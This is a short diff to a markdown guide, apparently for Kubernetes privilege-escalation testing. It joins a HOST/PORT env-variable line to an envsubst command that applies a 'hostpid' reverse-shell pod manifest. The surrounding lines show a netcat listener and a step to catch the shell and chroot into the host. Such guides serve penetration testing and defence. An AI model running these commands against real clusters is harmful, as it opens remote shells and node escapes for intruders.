@@ -68,8 +68,7 @@ nc -nvlp 3116
 #### Create the pod
 ```bash
 # Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
-HOST="10.0.0.1" PORT="3116" 
-envsubst < ./yaml/hostpid/pod-hostpid-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/hostpid/pod-hostpid-revshell.yaml | kubectl apply -f -
 ```
 
 #### Catch the shell and chroot to /host 
